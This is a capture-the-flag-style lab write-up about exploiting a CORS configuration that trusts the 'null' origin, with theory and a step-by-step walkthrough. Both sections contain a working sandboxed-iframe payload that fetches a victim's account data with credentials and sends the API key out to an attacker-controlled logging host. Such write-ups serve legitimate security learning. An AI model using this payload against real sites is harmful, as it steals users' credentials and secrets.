Title: CORS vulnerability with trusted null origin
Desc:  This website has an insecure CORS configuration in that it trusts the "null" origin.
To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: wiener:peter 

# Theory: 
Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:\
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```
And the server responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

# Walkthrough:

We have the same request for API key: 
<img width="1082" height="374" alt="image" src="https://github.com/user-attachments/assets/6428b76c-84ff-4a83-8c8c-69b8904411bb" />

In this request I try to add null Origin:
<img width="1041" height="325" alt="image" src="https://github.com/user-attachments/assets/a7e35c55-201c-4210-8d6a-d526c4649494" />
It is reflected.

Now I try to run on my exploit server this tricky payload: 
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a4200520397808097893c9100860098.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a78004b030c807797793b9601d900fb.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
```
After delivering exploit to the victim I can see API key in the log:
